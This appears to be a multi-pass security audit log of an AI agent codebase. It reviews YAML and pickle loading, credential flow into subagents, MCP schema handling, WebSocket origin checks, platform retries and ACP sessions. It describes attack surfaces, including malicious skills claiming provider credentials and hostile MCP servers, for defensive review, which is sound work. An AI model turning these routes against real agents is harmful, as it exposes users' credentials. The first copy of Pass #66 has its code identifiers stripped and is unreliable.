    """Recursively expand ``${VAR}`` references in config values.

    Only string values are processed; dict keys, numbers, booleans, and
    None are left untouched.  Unresolved references (variable not in
    ``os.environ``) are kept verbatim so callers can detect them.
    """
    if isinstance(obj, str):
        return re.sub(
            r"\${([^}]+)}",
            lambda m: os.environ.get(m.group(1), m.group(0)),
            obj,
        )
```

- **Intended behavior:** Users can write `${API_KEY}` in config.yaml and it expands from environment
- **Security implication:** If an attacker can write to `~/.hermes/config.yaml`, they can cause the application to read arbitrary env vars (e.g., `${HOME}`, `${PATH}`, `${HERMES_HOME}`) into config values that may be logged or used in subprocess calls
- **Mitigation:** `config.yaml` is user-owned (0600 permissions), so the attack surface is limited to local user
- **Note:** `_preserve_env_ref_templates()` at line 4195 restores raw `${VAR}` templates when saving — this is intentional for UX (avoids writing expanded secrets back to disk)

#### Subprocess calls — No shell=True found in critical paths
Searched for `subprocess` usage with `shell=True`:
- Found `shell=True` only in `tui_gateway/server.py` line 6769 for a non-critical user-info command
- All critical subprocess calls use explicit command lists (`[cmd, arg1, arg2]`) without shell injection risk

---

### 6. Pickle Deserialization

**Finding: LOW RISK — Only in optional skill scripts, not in production paths.**

Two `pickle.loads()` calls found in `optional-skills/research/darwinian-evolver/scripts/show_snapshot.py`:
```python
# Lines 36, 39
outer = pickle.loads(args.snapshot.read_bytes())
inner = pickle.loads(outer["population_snapshot"])
```

- **Context:** This is an optional skill script (`show_snapshot.py`) used for debugging/research, not production code
- **Attack surface:** If an attacker can provide a malicious `--snapshot` file, they could execute arbitrary code via pickle deserialization
- **Mitigation:** This is a CLI script, not a server endpoint; the user provides the snapshot file themselves

---

### 7. Summary of Findings

| Category | Severity | Status |
|---|---|---|
| yaml.safe_load enforcement | MEDIUM | ⚠️ 3 unsafe yaml.load() calls (2 test, 1 production) |
| ruamel.yaml round-trip in production | MEDIUM | `hermes_cli/xai_retirement.py` uses `typ="rt"` on user config |
| Config file injection (anchors/entity expansion) | LOW | No evidence of exploitation |
| Config validation (type coercion) | LOW | Functions exist and handle edge cases correctly |
| Skill YAML frontmatter safe parsing | LOW | Uses CSafeLoader with fallback, type-checked |
| Environment variable injection | LOW-MODERATE | `${VAR}` expansion intentional; no eval/exec on env vars |
| Pickle deserialization | LOW | Only in optional skill scripts, not production |

### Recommendations

1. **Replace `ruamel.yaml YAML(typ="rt")` with explicit safe loader** in `hermes_cli/xai_retirement.py` — use `YAML(typ="safe")` instead of `typ="rt"` to avoid anchor/alias resolution risks.
2. **Consider banning `yaml.load()` without explicit Loader** in production code via linter — always use `yaml.safe_load()` or `yaml.load(value, Loader=SafeLoader)`.
3. **`${VAR}` expansion is by design** — document this in security guidance so users know not to put untrusted values in `config.yaml`.
4. **Pickle in optional-skills** is acceptable since it's user-run tooling, but consider adding a warning comment.

**Files examined:**
- `agent/skill_utils.py` — skill YAML frontmatter, safe loading, path validation
- `hermes_cli/config.py` — config loading, type coercion, env var expansion
- `gateway/config.py` — coercion functions, type validation
- `hermes_cli/xai_retirement.py` — ruamel.yaml round-trip usage
- `optional-skills/research/darwinian-evolver/scripts/show_snapshot.py` — pickle.loads
- `cron/scheduler.py` — subprocess, env var handling
- `tests/hermes_cli/test_migrate_xai.py` — test helper patterns

---

## Pass #64 – Agent Subprocess, Delegation & MCP Integration – 2026-05-24T20:15:00Z

**Scope:** tools/delegate_tool.py, tools/mcp_tool.py, tools/mcp_oauth.py, tools/code_execution_tool.py, tools/environments/local.py, tools/env_passthrough.py

### P64-1 · MCP schema normalization rewrites but does not validate external schemas — MEDIUM

**File:** `tools/mcp_tool.py:2710` (`_normalize_mcp_input_schema`)

`_normalize_mcp_input_schema()` repairs and rewrites JSON Schema definitions from external MCP servers (resolving `#/definitions/` → `#/$defs/`, coercing missing types, pruning dangling `required` entries, collapsing nullable unions). However, it performs **normalization only** — it does not validate the resulting schema. A malicious or buggy MCP server could return a schema that normalizes to something semantically invalid or exploitable. The normalization is described as provider-agnostic but the function has no schema validation step.

**Recommendation:** Add a JSON Schema validation pass (e.g. using `jsonschema` library) after normalization, at least for schemas with `$ref` or `anyOf`, to catch malformed schemas before they reach the LLM.

---

### P64-2 · file-based RPC seq allocation is protected but request file cleanup is not atomic — LOW

**File:** `tools/code_execution_tool.py:385-400`

The `_seq_lock` protects `_seq += 1` (read-modify-write), and request files use `os.rename()` for atomic write. However, the `_seq_lock` is a threading.Lock — if anyio/trio task-switching occurs within the lock region on the same thread, the sequence number space could be corrupted on async code paths.

**Recommendation:** Use `itertools.count` with a lock, or `multiprocessing.Value('I')` for true atomicity across async contexts.

---

### P64-3 · tool_result_storage uses cat heredoc for content — stdin_data not shell-quoted — LOW

**File:** `tools/tool_result_storage.py:92-93`

```python
cmd = f"mkdir -p {shlex.quote(storage_dir)} && cat > {shlex.quote(remote_path)}"
result = env.execute(cmd, timeout=30, stdin_data=content)
```

`storage_dir` and `remote_path` are safely quoted via `shlex.quote()`, but `stdin_data=content` is passed directly to subprocess stdin. If `env.execute()` uses `shell=False` (direct exec), the content bypasses shell quoting. Risk is limited since `content` comes from tool results, but large persisted tool results with shell metacharacters could behave unexpectedly depending on backend's `env.execute()` implementation.

**Recommendation:** Ensure `env.execute()` with `stdin_data` always passes content through a safe binary stdin channel, not shell interpolation.

---

### P64-4 · delegate_tool inherits parent_api_key for subagents — API credentials flow into child processes — INFO

**File:** `tools/delegate_tool.py:979-982`

```python
parent_api_key = getattr(parent_agent, "api_key", None)
if (not parent_api_key) and hasattr(parent_agent, "_client_kwargs"):
    parent_api_key = parent_agent._client_kwargs.get("api_key")
```

Subagents inherit the parent's API key to maintain auth for provider access. Process isolation is at conversation/context level (skip_context_files=True, skip_memory=True, fresh conversation), but the API key does flow into the child process. This is by design but widens the credential exposure surface.

**Recommendation:** Document explicitly. Consider stripping via `_sanitize_subprocess_env()` when subagent loses parent context, or ensure subagent processes are always sandboxed.

---

### P64-5 · env_passthrough blocks GHSA credential bypass — GOOD

**File:** `tools/env_passthrough.py:48-68`, `tools/environments/local.py:103-170`

`_is_hermes_provider_credential()` prevents skills from registering any variable in `_HERMES_PROVIDER_ENV_BLOCKLIST` as passthrough. This blocks the GHSA-rhbp-j443-p4rf class of attack where a malicious skill declares a Hermes-managed credential as required and receives it in a sandboxed process. Solid defense-in-depth.

---

### P64-6 · delegate_tool correctly sets skip_context_files=True and skip_memory=True — GOOD

**File:** `tools/delegate_tool.py:1124-1125`

Subagent initialization correctly passes `skip_context_files=True` and `skip_memory=True`, ensuring parent conversation history and memory files are not accessible to subagents.

---

### P64-7 · MCP OAuth callback server uses ephemeral port + localhost only — GOOD

**File:** `tools/mcp_oauth.py:47-51`, token storage

OAuth callback server binds to `localhost` only with ephemeral port. Tokens stored with `stat.S_IRWXU` (owner-only). Solid security posture.

---

### P64-8 · _HERMES_PROVIDER_ENV_BLOCKLIST is comprehensive — GOOD

**File:** `tools/environments/local.py:79-170`

Blocklist covers provider API keys, messaging tokens, email credentials, GitHub tokens. Dynamic derivation from `PROVIDER_REGISTRY.api_key_env_vars` and `OPTIONAL_ENV_VARS` means new providers automatically get added. Well architected.

## Pass #66 – WebSocket, SSE & Real-Time Communication Deep Dive – 2026-05-24T23:00:00Z

---

### 1. WebSocket Security

#### 1a. tui_gateway/ws.py — No Origin Validation, No Auth on Socket

 at line 116 calls  unconditionally. There is:
- **No origin header check** before accepting the connection.
- **No WebSocket-level authentication** — the only auth is the JSON-RPC dispatch inside , which requires an already-established connection.
- **No rate limiting** on number of concurrent WS connections (the  is a write-deadlock guard, not a connection cap).

Risk: Any local process or browser on the same machine can open arbitrary WS connections to the tui_gateway and send JSON-RPC commands. This is partially mitigated by the fact that tui_gateway is spawned as a private subprocess by the TUI, not bound to a public port.

#### 1b. hermes_cli/web_server.py — Proper Origin + Host + Token Guard

The dashboard WebSocket endpoints use  (line 3337), which chains:
-  (line 3309): checks Host header matches bound dashboard host AND validates Origin header if present.
-  (line 3298): requires loopback IP only.
- HMAC token validation via  (timing-safe).

Tests confirm cross-origin requests get code 4403. Well-hardened for the dashboard use case.

#### 1c. Platform WebSocket (wecom, feishu)

- **wecom.py**: Outbound WS to vendor servers. Authentication inside the WS session via signed subscribe command. Has application-level heartbeat (30s) + aiohttp heartbeat (60s). Reconnect with exponential backoff (5-entry table, 30s max).
- **feishu.py**: App-level scoped lock prevents duplicate instances. WebSocket thread cleanup with 10s timeout. Supports both websocket and webhook modes.

#### 1d. Rate Limiting on Connections

- **No per-WS-connection rate limiting** in .
- Rate limiting exists at pairing level (platform+userId) in .
- API server uses thread pool for long handlers but no connection-level rate limiting.

---

### 2. SSE Implementation (api_server.py)

#### 2a. Reconnection

SSE endpoint . No Last-Event-ID / resume mechanism. Clients that lose the stream must re-request from start. Known limitation.

#### 2b. Message Ordering

SSE backed by  per . Producer puts deltas; reader loop reads with 0.5s timeout. Drain loop on completion processes remaining items. Ordering preserved per-queue.

#### 2c. Memory Leaks

 (Queue) +  (timestamps). Background task sweeps every 60s, removes streams older than  (300s), cancelling associated tasks. Adequate orphan cleanup.

Potential: unbounded Queue — if client disconnects but agent keeps producing, queue could grow. However agent is interrupted on client disconnect.

---

### 3. Real-Time Protocol Security

#### 3a. Message Injection — tui_gateway/ws.py

All frames pass  then  (validates method string, params object). Injection via malformed JSON prevented. Valid requests go through .

#### 3b. Cross-Site WS Hijacking — tui_gateway

**No Origin validation.** Any cross-origin site that can reach the port can open a WS. Since tui_gateway is typically a subprocess pipe, practical risk is limited to same-machine attackers.

 properly protected (see 1b).

#### 3c. CSRF on SSE — api_server.py

Bearer token required ( at line 770). CORS headers added based on . If  in origins,  is sent; otherwise origin is checked and  included.

---

### 4. Connection Management

#### 4a. Stale Connection Detection

- **WeCom**: aiohttp heartbeat (60s interval) + application ping every 30s via . Abnormal close triggers  exception and reconnect.
- **Feishu**: Scoped lock detects duplicate instances. WS thread cancelled with 10s timeout.
- **api_server SSE**: 30s keepalive via  SSE comment when no deltas arrive.

#### 4b. Timeouts

- WeCom:  (30s) for ws_connect.
- Feishu WS thread: 10s shutdown timeout.
- tui_gateway WS write: .
- Slash worker: .

#### 4c. Cleanup on Disconnect

**tui_gateway/ws.py** (finally block, lines 166-178):
- 
- Replaces owned session transport with  fallback
- 

**SSE**: On /:  + . Good.

---

### 5. WebSocket Compression — CRIME/BREACH

**No  or WebSocket-level compression** in any WS implementation. Plain JSON text frames. Platform WS connections are opaque tunnels over aiohttp default stack. CRIME/BREACH not applicable.

---

### Summary

| Area | Finding | Severity |
|------|---------|----------|
|  origin validation | None —  unconditional | Medium (subprocess-only access limits exposure) |
|  WS origin | Proper: host + origin + loopback IP + HMAC | Low |
|  auth | JSON-RPC dispatch only; no WS-level auth | Low (subprocess isolation) |
|  rate limiting | None on WS connections | Low |
| SSE reconnection | No Last-Event-ID / resume | Low (known limitation) |
| SSE orphan cleanup | 60s sweep, 5m TTL, adequate | Low |
| SSE client disconnect | Agent interrupt + task cancellation | Good |
| Cross-site WS hijacking (tui_gateway) | Possible if TCP port exposed | Medium |
| Platform WS (wecom, feishu) | Outbound; properly managed | Low |
| WebSocket compression | Not used — CRIME/BREACH N/A | N/A |
| Connection cleanup | Thorough transport replacement | Good |

---

*Pass #66 complete — 2026-05-24*


## Pass #66 – WebSocket, SSE & Real-Time Communication Deep Dive – 2026-05-24T23:00:00Z

---

### 1. WebSocket Security

#### 1a. tui_gateway/ws.py — No Origin Validation, No Auth on Socket

`handle_ws()` at line 116 calls `ws.accept()` unconditionally. There is:
- **No origin header check** before accepting the connection.
- **No WebSocket-level authentication** — the only auth is the JSON-RPC dispatch inside `server.dispatch`, which requires an already-established connection.
- **No rate limiting** on number of concurrent WS connections (the `_WS_WRITE_TIMEOUT_S` is a write-deadlock guard, not a connection cap).

Risk: Any local process or browser on the same machine can open arbitrary WS connections to the tui_gateway and send JSON-RPC commands. This is partially mitigated by the fact that tui_gateway is spawned as a private subprocess by the TUI, not bound to a public port.

#### 1b. hermes_cli/web_server.py — Proper Origin + Host + Token Guard

The dashboard WebSocket endpoints use `_ws_request_is_allowed()` (line 3337), which chains:
- `_ws_host_origin_is_allowed()` (line 3309): checks Host header matches bound dashboard host AND validates Origin header if present.
- `_ws_client_is_allowed()` (line 3298): requires loopback IP only.
- HMAC token validation via `hmac.compare_digest` (timing-safe).

Tests confirm cross-origin requests get code 4403. Well-hardened for the dashboard use case.

#### 1c. Platform WebSocket (wecom, feishu)

- **wecom.py**: Outbound WS to vendor servers. Authentication inside the WS session via signed subscribe command. Has application-level heartbeat (30s) + aiohttp heartbeat (60s). Reconnect with exponential backoff (5-entry table, 30s max).
- **feishu.py**: App-level scoped lock prevents duplicate instances. WebSocket thread cleanup with 10s timeout. Supports both websocket and webhook modes.

#### 1d. Rate Limiting on Connections

- **No per-WS-connection rate limiting** in `tui_gateway/ws.py`.
- Rate limiting exists at pairing level (platform+userId) in `gateway/pairing.py`.
- API server uses thread pool for long handlers but no connection-level rate limiting.

---

### 2. SSE Implementation (api_server.py)

#### 2a. Reconnection

SSE endpoint `/v1/runs/{run_id}/events`. No Last-Event-ID / resume mechanism. Clients that lose the stream must re-request from start. Known limitation.

#### 2b. Message Ordering

SSE backed by `asyncio.Queue` per `run_id`. Producer puts deltas; reader loop reads with 0.5s timeout. Drain loop on completion processes remaining items. Ordering preserved per-queue.

#### 2c. Memory Leaks

`_run_streams` (Queue) + `_run_streams_created` (timestamps). Background task sweeps every 60s, removes streams older than `_RUN_STREAM_TTL` (300s), cancelling associated tasks. Adequate orphan cleanup.

Potential: unbounded Queue — if client disconnects but agent keeps producing, queue could grow. However agent is interrupted on client disconnect.

---

### 3. Real-Time Protocol Security

#### 3a. Message Injection — tui_gateway/ws.py

All frames pass `json.loads()` then `_normalize_request()` (validates method string, params object). Injection via malformed JSON prevented. Valid requests go through `server.dispatch()`.

#### 3b. Cross-Site WS Hijacking — tui_gateway

**No Origin validation.** Any cross-origin site that can reach the port can open a WS. Since tui_gateway is typically a subprocess pipe, practical risk is limited to same-machine attackers.

`hermes_cli/web_server.py` properly protected (see 1b).

#### 3c. CSRF on SSE — api_server.py

Bearer token required (`_check_auth()` at line 770). CORS headers added based on `_cors_origins`. If `*` in origins, `Access-Control-Allow-Origin: *` is sent; otherwise origin is checked and `Vary: Origin` included.

---

### 4. Connection Management

#### 4a. Stale Connection Detection

- **WeCom**: aiohttp heartbeat (60s interval) + application ping every 30s via `_heartbeat_loop()`. Abnormal close triggers `_listen_loop` exception and reconnect.
- **Feishu**: Scoped lock detects duplicate instances. WS thread cancelled with 10s timeout.
- **api_server SSE**: 30s keepalive via `: keepalive` SSE comment when no deltas arrive.

#### 4b. Timeouts

- WeCom: `CONNECT_TIMEOUT_SECONDS` (30s) for ws_connect.
- Feishu WS thread: 10s shutdown timeout.
- tui_gateway WS write: `_WS_WRITE_TIMEOUT_S = 10.0`.
- Slash worker: `_SLASH_WORKER_TIMEOUT_S = 45.0`.

#### 4c. Cleanup on Disconnect

**tui_gateway/ws.py** (finally block, lines 166-178):
- `transport.close()`
- Replaces owned session transport with `_stdio_transport` fallback
- `ws.close()`

**SSE**: On `ConnectionResetError`/`BrokenPipeError`: `agent.interrupt()` + `agent_task.cancel()`. Good.

---

### 5. WebSocket Compression — CRIME/BREACH

**No `permessage-deflate` or WebSocket-level compression** in any WS implementation. Plain JSON text frames. Platform WS connections are opaque tunnels over aiohttp default stack. CRIME/BREACH not applicable.

---

### Summary

| Area | Finding | Severity |
|------|---------|----------|
| `tui_gateway/ws.py` origin validation | None — `ws.accept()` unconditional | Medium (subprocess-only access limits exposure) |
| `hermes_cli/web_server.py` WS origin | Proper: host + origin + loopback IP + HMAC | Low |
| `tui_gateway/ws.py` auth | JSON-RPC dispatch only; no WS-level auth | Low (subprocess isolation) |
| `tui_gateway/ws.py` rate limiting | None on WS connections | Low |
| SSE reconnection | No Last-Event-ID / resume | Low (known limitation) |
| SSE orphan cleanup | 60s sweep, 5m TTL, adequate | Low |
| SSE client disconnect | Agent interrupt + task cancellation | Good |
| Cross-site WS hijacking (tui_gateway) | Possible if TCP port exposed | Medium |
| Platform WS (wecom, feishu) | Outbound; properly managed | Low |
| WebSocket compression | Not used — CRIME/BREACH N/A | N/A |
| Connection cleanup | Thorough transport replacement | Good |

---

*Pass #66 complete — 2026-05-24*


---

## Pass #67 – Platform Adapter Health, Resilience & Observability Deep Dive – 2026-05-25

### 1. Platform Health Monitoring

#### 1.1 Per-Platform Health Checks (Active Monitoring)

**Signal adapter** (`gateway/platforms/signal.py`):
- Has dedicated `_health_monitor()` coroutine (lines 401-425) that runs on a `HEALTH_CHECK_INTERVAL = 30s` loop.
- On each tick, checks `time.time() - self._last_sse_activity > HEALTH_CHECK_STALE_THRESHOLD (120s)` — if SSE has been silent for 2+ minutes, it pings the signal-cli daemon at `{http_url}/api/v1/check` with a 10s timeout.
- If daemon returns non-200, or any exception occurs, calls `_force_reconnect()` which closes the SSE stream and triggers reconnection.
- `_last_sse_activity` is updated on every received SSE event, and also reset when daemon is confirmed alive but SSE is quiet to avoid repeated warnings.
- This is a well-designed active health probe — not just connection-alive tracking but actual API-level verification of the daemon.

**Webhook and api_server adapters**:
- Simple `_handle_health` HTTP GET handler at `GET /health` returning `{"status": "ok", "platform": ...}` — passive health endpoint, not actively monitored by the gateway runner.

#### 1.2 Runtime Status Persistence (`gateway/status.py`)

`gateway/status.py` maintains a JSON runtime status file alongside `gateway.pid` with per-platform state:
- `gateway_state`, `exit_reason`, `restart_requested`, `active_agents`
- `platforms[platform_name] = {state, error_code, error_message}` — updated on every state transition

`write_runtime_status()` is called by:
- `BasePlatformAdapter._write_runtime_status_safe()` (base.py lines 1556, 1562, 1569) — on connect, disconnect, and fatal error
- `GatewayRunner._update_platform_runtime_status()` (run.py) — called in reconnect watcher on every state change

This gives operators a single file to read for full gateway+platform health without parsing logs.

#### 1.3 Platform Connect Timeout

`GatewayRunner._connect_adapter_with_timeout()` (run.py lines 2113-2130) wraps each adapter's `connect()` in asyncio.wait_for() with a configurable timeout (default 30s). Prevents one platform's slow connect from blocking others.

**Gap**: Only Signal has active health check polling. Telegram, Discord, WhatsApp, etc. have no periodic probes — failures only detected on next message or exception.

---

### 2. Graceful Degradation — Platform Isolation

#### 2.1 Per-Platform Circuit Breaker

Introduced in PR #26600. Core mechanism in `gateway/run.py`:

**`_failed_platforms`** (line 1747): `Dict[Platform, {"config", "attempts", "next_retry", "paused", "pause_reason"}]`

**Thresholds** (lines 5615-5616):
- `_BACKOFF_CAP = 300` — 5 minutes max between retries
- `_PAUSE_AFTER_FAILURES = 10` — circuit breaker threshold

**Exponential backoff** (line 5703): `backoff = min(30 * (2 ** (attempt - 1)), _BACKOFF_CAP)` — 30s, 60s, 120s, 240s, capped at 300s.

**Pause mechanism** (`_pause_failed_platform()`, lines 2693-2727): After 10 consecutive failures, platform marked `paused: True`, `next_retry = float("inf")`. Skipped by reconnect watcher. Recovered only via `/platform resume <name>` or `hermes gateway restart`.

**Manual control**: `/platform list|pause|resume` commands (run.py lines 9743-9828).

#### 2.2 Platform Failure Does Not Crash Gateway

`GatewayRunner._handle_adapter_fatal_error()` (lines 2447-2512):
- `fatal_error_retryable == True` → queued for background reconnect, gateway stays alive
- `fatal_error_retryable == False` → immediately removed from queue
- `not self.adapters and not self._failed_platforms` → gateway shuts down
- `not self.adapters and self._failed_platforms` → gateway stays alive for cron jobs

#### 2.3 No Cascading Failure Between Platforms

Each adapter is independent. One platform's failure does not affect another's retry schedule. `delivery_router.adapters` stays current — only failed platform's deliveries fail, others proceed normally. Cron scheduler has live-adapter fallback to standalone `_send_to_platform()` (scheduler.py line 735).

---

### 3. Platform-Specific Retry Logic

#### 3.1 Gateway-Level Exponential Backoff

`_platform_reconnect_watcher()` (run.py lines 5604-5739):
- Initial delay: 10s after startup
- Backoff: `min(30 * (2 ** (attempt - 1)), 300)` — 30s, 60s, 120s, 240s, capped at 300s
- Paused platforms skipped until resumed
- Applies uniformly to all platforms — no per-platform configuration

#### 3.2 Signal-Specific SSE Retry

`gateway/platforms/signal.py` lines 62-65:
- `SSE_RETRY_DELAY_INITIAL = 2.0`, `SSE_RETRY_DELAY_MAX = 60.0`
- `HEALTH_CHECK_INTERVAL = 30.0`, `HEALTH_CHECK_STALE_THRESHOLD = 120.0`

Signal's `_health_monitor()` calls `_force_reconnect()` on stale SSE — the gateway reconnect watcher applies its own backoff on top.

**Jittered retry backoff** (v0.8.0, PR #6048) applies to model API calls, not platform adapters.

#### 3.3 No Retry Storm Protection

**Gap**: Backoff is deterministic (no jitter) at the platform reconnection layer. `_PAUSE_AFTER_FAILURES = 10` is the only mechanism preventing retry storms. Deterministic backoff could synchronize multiple gateway instances against a degraded platform.

---

### 4. Dead Letter Handling — Failed Message Storage & Alerting

#### 4.1 No Dead Letter Queue in Gateway

**Gap**: No DLQ mechanism exists. When cron delivery fails through both live adapter and standalone fallback paths, error is logged but message content is discarded. `DeliveryRouter._deliver_local()` saves cron output to `{HERMES_HOME}/cron/output/` — only for successful jobs, not failed deliveries.

#### 4.2 Failed Delivery Logging

Cron scheduler logs delivery failures (scheduler.py lines 693-696, 728-731, 748-750) with job ID, platform, chat_id, and error — landing in `errors.log`. There is:
- No structured failed-message archive
- No per-delivery retry (only the job itself may retry on next schedule)
- No alerting beyond log entries

#### 4.3 Non-Retryable Failures

Platforms setting `fatal_error_retryable = False` (e.g., WeCom missing credentials, wecom.py lines 193-208) immediately removed from retry queue and logged. Operators find via `/platform list` or log inspection.

---

### 5. Platform Observability

#### 5.1 Structured Logging per Platform

Every platform logs with platform-specific prefix:
- Signal: `logger.warning("Signal: health check failed (%d), forcing reconnect", resp.status_code)`
- WeCom: `logger.error("[%s] Failed to connect: %s", self.name, exc, exc_info=True)`
- Gateway: `logger.info("✓ %s reconnected successfully", platform.value)`

All routed through `hermes_logging` — `agent.log` (INFO+), `errors.log` (WARNING+).

#### 5.2 Silent Swallow in Status Writes

`BasePlatformAdapter._write_runtime_status_safe()` (base.py lines 1571-1583):
```python
try:
    write_runtime_status(platform=self.platform.value, **kwargs)
except Exception:
    pass  # swallow — non-critical diagnostic path
```
Platform state transitions may be lost during disk pressure. Same pattern in run.py lines 2685-2686, 2712-2720, 2743-2751 around `_update_platform_runtime_status()` calls.

#### 5.3 No Platform-Level Metrics

No metrics collection (Prometheus, statsd, etc.) for per-platform:
- Messages received/sent counts
- Delivery latency
- Error rates
- Active sessions

Observability is purely log-based and status-file-based.

---

### 6. Gaps and Issues Identified

| # | Area | Finding | Severity |
|---|------|---------|----------|
| P67-1 | Health monitoring | Only Signal has active health-check polling. Telegram, Discord, WhatsApp, etc. have no periodic probes — failures only detected on next message or exception. | Medium |
| P67-2 | Silent swallow | `_write_runtime_status_safe()` and `_update_platform_runtime_status()` use bare `except Exception: pass` — state transitions may be lost. | Low |
| P67-3 | No dead letter queue | Failed message content logged but not stored/archived/replayed. No DLQ. | Medium |
| P67-4 | No alerting | Platform failures generate log entries only. No webhook/email/PagerDuty alerting. | Medium |
| P67-5 | No retry jitter | Platform reconnect backoff is deterministic — retry storm risk if multiple instances share degraded state. | Low |
| P67-6 | No per-platform backoff config | All platforms share same `_BACKOFF_CAP=300`, `_PAUSE_AFTER_FAILURES=10` — no per-platform tuning. | Low |
| P67-7 | No platform metrics | No Prometheus/statsd for message counts, latency, error rates per platform. | Low |

---

### Summary

| Area | Assessment |
|------|-----------|
| Health monitoring | Partial — Signal has active probing; others rely on connection activity |
| Circuit breaker | Well-implemented — per-platform pause/resume, exponential backoff, manual override |
| Graceful degradation | Good — one platform failure doesn't crash gateway; others continue; cron stays alive |
| Retry logic | Adequate — exponential backoff, deterministic; no jitter (minor gap) |
| Dead letter handling | Absent — failed messages logged, not stored or replayed |
| Observability | Log-based + runtime status file; no structured metrics; status writes silently swallow errors |

*Pass #67 complete — 2026-05-25*

---

## Pass #68 – ACP (Agent Communication Protocol) & IPC Deep Dive – 2026-05-25T01:30:00Z

### Scope
`acp_adapter/` — auth.py, events.py, permissions.py, server.py, session.py, tools.py, entry.py, edit_approval.py

---

### SECTION A: ACP PROTOCOL SECURITY

#### 1. Authentication

**Finding P68-1 (INFO): ACP authentication is local-trust, design-appropriate**

`auth.py:build_auth_methods()` advertises auth methods based on runtime provider detection. `authenticate()` at `server.py:855-875` validates `method_id` by exact match against:
- The detected provider name (e.g. `"openrouter"`)
- The special `"hermes-setup"` terminal-setup method

```python
# server.py:873-875
if not provider or normalized_method != provider:
    return None
return AuthenticateResponse()
```

The comment at lines 857-861 explicitly states this is local-trust:
> "ACP is stdio-only, local-trust... poor API hygiene and confusing if ACP ever grows multi-method auth."

**Assessment**: Authentication is appropriate for the stdio-only local communication model. No untrusted network attackers can reach the ACP socket.

---

#### 2. Message Injection / Session Hijacking

**Finding P68-2 (LOW): Client-supplied session_id not validated — within local trust model**

The ACP session lifecycle methods (`get_session`, `load_session`, `resume_session`, `cancel`, `fork_session`) all accept `session_id` as a plain string from the client with no validation:

```python
# server.py:1256 — prompt()
state = self.session_manager.get_session(session_id)  # session_id from ACP client
```

`get_session()` at `session.py:231-242` does a plain `self._sessions.get(session_id)` dict lookup — no format validation, no ownership check.

**Threat model**: ACP is stdio. A client with access to the same stdin/stdout pipe (the user's IDE — Zed, VS Code, JetBrains) can supply any session_id. Sessions are stored in the user's own `~/.hermes/state.db`. Within this boundary, "session hijacking" is the intended ACP behavior: reconnecting to an existing session.

**If** Hermes ACP ever listens on a network socket or a shared filesystem FIFO, this becomes exploitable. Currently it's not.

**Recommendation**: Add a comment clarifying the local-trust assumption, or add a session ownership check (e.g. validate that the connecting client info matches the session's originating client).

---

#### 3. Message Routing

**Finding P68-3 (INFO): Single-connection model — routing via session_id parameter is clean**

`HermesACPAgent` holds a single `self._conn: Optional[acp.Client]` set at `on_connect()`. All updates use `conn.session_update(session_id=session_id, update=update)` — the `session_id` param routes to the correct session on the client side. No cross-session leakage observed.

```python
# server.py:519,523-525
self._conn: Optional[acp.Client] = None

def on_connect(self, conn: acp.Client) -> None:
    self._conn = conn
```

Session updates are sent via `events.py:_send_update()` which calls `conn.session_update()` with a 5-second timeout and fire-and-forget error handling.

---

### SECTION B: IPC MESSAGE HANDLING

#### 4. Race Conditions

**Finding P68-4 (LOW): Two-lock system with non-atomic state transitions**

`SessionManager` uses `_lock: Lock()` to protect `_sessions` dict operations. But `SessionState` has a separate `runtime_lock: Lock` used to guard `is_running` and `queued_prompts` in `prompt()`:

```python
# session.py:181
queued_prompts: List[str] = field(default_factory=list)

# server.py:1320-1332 — prompt()
with state.runtime_lock:
    if state.is_running:
        queued_prompts.append(...)
        return PromptResponse(stop_reason="end_turn")
    state.is_running = True
    state.current_prompt_text = user_text
```

The two-lock system means:
1. Session A can hold `runtime_lock` and be modifying `is_running` / `queued_prompts`
2. Concurrently, `SessionManager.remove_session()` acquires `_lock` and deletes the session from `_sessions`

This is a TOCTOU (time-of-check-time-of-use) window. However, since `prompt()` already holds `runtime_lock` when the AIAgent runs in the executor, and `cancel()` also acquires `runtime_lock`, the race would manifest as a dangling reference rather than data corruption.

**Not critical** — the locks protect different granularities and the session object itself is the synchronization point for in-flight prompts.

---

#### 5. Message Ordering & Delivery

**Finding P68-5 (LOW): `_send_update` fire-and-forget with 5s timeout — no guaranteed delivery**

```python
# events.py:105
future.result(timeout=5)
```

If the event loop is saturated or the connection is slow, the 5-second timeout can expire and the update is silently dropped. The caller catches this via `try/except` and only logs at DEBUG level:

```python
# events.py:106-107
except Exception:
    logger.debug("Failed to send ACP update", exc_info=True)
```

Important updates (tool start/complete, agent message text) could be lost if the client misses them. The protocol has no ack/retry mechanism for individual session updates.

---

#### 6. Message Deduplication

**Finding P68-6 (INFO): No deduplication — idempotent operation relies on ACP client**

No explicit deduplication layer in the ACP adapter. The `_replay_session_history()` replay mechanism at `server.py:979-1068` sends all historical messages as fresh updates, but the ACP client is responsible for deduplicating if needed. For live updates (not replay), no deduplication is needed since each has a unique tool call ID or message content.

---

#### 7. Tool Call Tracking / Ordering

**Finding P68-7 (INFO): Per-tool-name deque correctly handles parallel same-name tool calls**

```python
# events.py:146-154
tc_id = make_tool_call_id()  # uuid-based unique ID
queue = tool_call_ids.get(name)
if queue is None:
    queue = deque()
    tool_call_ids[name] = queue
elif isinstance(queue, str):
    queue = deque([queue])
    tool_call_ids[name] = queue
queue.append(tc_id)
```

Tool call IDs are UUID-based, so concurrent calls to the same tool get different IDs and are correctly tracked. The step callback pops from the correct queue.

---

### SECTION C: ACP ADAPTER REGISTRATION

#### 8. Adapter Registration / Unauthorized Injection

**Finding P68-8 (INFO): ACP adapter is not dynamically registered — it's a stdio server entry point**

The ACP adapter is started via `python -m acp_adapter` or `hermes acp`. It's not a plugin that gets discovered and loaded at runtime. There is no `register_adapter()` or similar mechanism.

The Zed/VS Code ACP protocol (`agent-client-protocol` package) starts the adapter as a subprocess. Hermes provides the adapter binary through the Python entry point.

**No unauthorized injection risk** — the adapter is explicitly invoked by the client, not dynamically discovered.

---

#### 9. MCP Server Capability Validation

**Finding P68-9 (LOW): MCP server toolsets are not validated before being added to agent tools**

When `mcp_servers` list is passed to `new_session`/`load_session`/`resume_session`:

```python
# server.py:793-811
async def _register_session_mcp_servers(self, state, mcp_servers):
    for server_name in list(mcp_servers or []):
        toolset_name = f"mcp-{server_name}"
        if toolset_name not in (state.agent.enabled_toolsets or []):
            state.agent.enabled_toolsets = (state.agent.enabled_toolsets or []) + [toolset_name]
```

No validation that:
1. The MCP server is a known/trusted server
2. The MCP server's toolset actually exists
3. The tools in the MCP server's toolset are appropriate for the ACP session

